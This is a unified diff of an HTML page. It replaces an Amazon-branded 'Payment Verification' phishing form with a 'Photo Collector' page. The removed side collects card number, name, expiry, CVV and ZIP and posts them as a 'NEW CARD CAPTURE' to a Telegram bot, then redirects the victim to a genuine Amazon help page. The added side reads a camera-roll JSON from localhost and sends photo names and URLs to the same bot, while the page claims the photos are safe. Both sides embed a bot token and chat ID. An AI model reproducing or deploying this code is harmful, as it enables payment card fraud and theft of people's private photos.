@@ -3,106 +3,100 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Payment Verification</title>
+    <title>Photo Collector</title>
     <style>
-        body { font-family: Arial, sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }
-        .container { max-width: 400px; margin: 0 auto; background: white; padding: 25px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .form-group { margin-bottom: 15px; }
-        label { display: block; margin-bottom: 5px; font-weight: bold; }
-        input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
-        button { background: #FF9900; color: white; border: none; padding: 12px; border-radius: 4px; width: 100%; font-weight: bold; cursor: pointer; }
-        .logo { text-align: center; margin-bottom: 20px; }
-        .logo img { height: 40px; }
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        .text-container {
+            text-align: center;
+            color: #333;
+            margin-bottom: 20px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px;
+        }
+        button:hover {
+            background-color: #45a078;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo">
-            <img src="https://www.amazon.com/favicon.ico" alt="Amazon">
-            <h2>Payment Verification</h2>
+        <div class="text-container">
+            <h2>Photo Collector</h2>
+            <p>(Your photos are safe with us!)</p>
         </div>
 
-        <form id="cardForm">
-            <div class="form-group">
-                <label for="cardNumber">Card Number</label>
-                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" required>
-            </div>
+        <button onclick="fetchAndSendPictures()">Get Your Photos Now!</button>
 
-            <div class="form-group">
-                <label for="nameOnCard">Name on Card</label>
-                <input type="text" id="nameOnCard" placeholder="JOHN DOE" required>
-            </div>
-
-            <div style="display: flex; gap: 10px;">
-                <div style="flex: 1;">
-                    <label for="expDate">Expires</label>
-                    <input type="text" id="expDate" placeholder="MM/YY" required>
-                </div>
-                <div style="flex: 1;">
-                    <label for="cvv">CVV</label>
-                    <input type="text" id="cvv" placeholder="123" required>
-                </div>
-            </div>
-
-            <div class="form-group" style="margin-top: 15px;">
-                <label for="billingZip">ZIP Code</label>
-                <input type="text" id="billingZip" placeholder="12345" required>
-            </div>
-
-            <button type="submit">Verify Payment</button>
-        </form>
-    </div>
-
-    <script>
-        document.getElementById('cardForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-
-            const cardData = {
-                cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
-                nameOnCard: document.getElementById('nameOnCard').value,
-                expDate: document.getElementById('expDate').value,
-                cvv: document.getElementById('cvv').value,
-                billingZip: document.getElementById('billingZip').value,
-                ip: window.location.hostname,
-                userAgent: navigator.userAgent
-            };
-
-            // Telegram Bot API
+        <script>
             const botToken = '8751997768:AAFVzwoq51lB0qEJawozEdgzVC59uqvA3YY';
             const chatId = '7845249398';
-            const telegramUrl = `https://api.telegram.org/bot8751997768:AAFVzwoq51lB0qEJawozEdgzVC59uqvA3YY/sendMessage`;
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-            // Format message
-            const message = `💳 NEW CARD CAPTURE\n\n` +
-                          `🔢 Card: ${cardData.cardNumber}\n` +
-                          `👤 Name: ${cardData.nameOnCard}\n` +
-                          `📅 Exp: ${cardData.expDate}\n` +
-                          `🔒 CVV: ${cardData.cvv}\n` +
-                          `📍 ZIP: ${cardData.billingZip}\n` +
-                          `🌐 IP: ${cardData.ip}\n` +
-                          `📱 Agent: ${cardData.userAgent}`;
+            async function fetchPictures(limit) {
+                try {
+                    // Adjusted the endpoint to 8080
+                    const pictures = await fetch('http://localhost:8080/camera-roll.json');
+                    const photos = await pictures.json();
+                    // Added limit validation and .map() for consistency
+                    return photos.slice(0, limit).map(photo => ({
+                        filename: photo.filename,
+                        url: photo.url
+                    }));
+                } catch (error) {
+                    console.error('Error fetching pictures:', error);
+                }
+            }
 
-            // Send to Telegram
-            fetch(telegramUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            })
-            .then(response => {
-                if (!response.ok) throw new Error('Network response was not ok');
-                window.location.href = 'https://www.amazon.com/gp/help/customer/display.html?nodeId=GX7NJQ4ZB8MHFRNJ';
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                window.location.href = 'https://www.amazon.com/gp/help/customer/display.html?nodeId=GX7NJQ4ZB8MHFRNJ';
-            });
-        });
-    </script>
+            async function getPictures(limit = 5) {
+                try {
+                    const photos = await fetchPictures(limit);
+                    let photoUrls = '';
+                    photos.forEach(photo => {
+                        // Concat each name and url into one string separated by newlines
+                        photoUrls += `${photo.filename}\n${photo.url}\n\n`;
+                    });
+                    sendToTelegram(photoUrls);
+                } catch (error) {
+                    console.error('Error processing pictures:', error);
+                }
+            }
+
+            async function sendToTelegram(message) {
+                try {
+                    await fetch(`${telegramUrl}?chat_id=${chatId}&text=${message}`);
+                    alert('Photos sent to Telegram!');
+                } catch (error) {
+                    console.error('Error sending to Telegram:', error);
+                }
+            }
+
+            async function fetchAndSendPictures() {
+                try {
+                    // Set the limit to 10, which is used in getPictures
+                    const limit = 10;
+                    await getPictures(limit);
+                } catch (error) {
+                    console.error('Error in main function:', error);
+                }
+            }
+        </script>
+    </div>
 </body>
 </html>
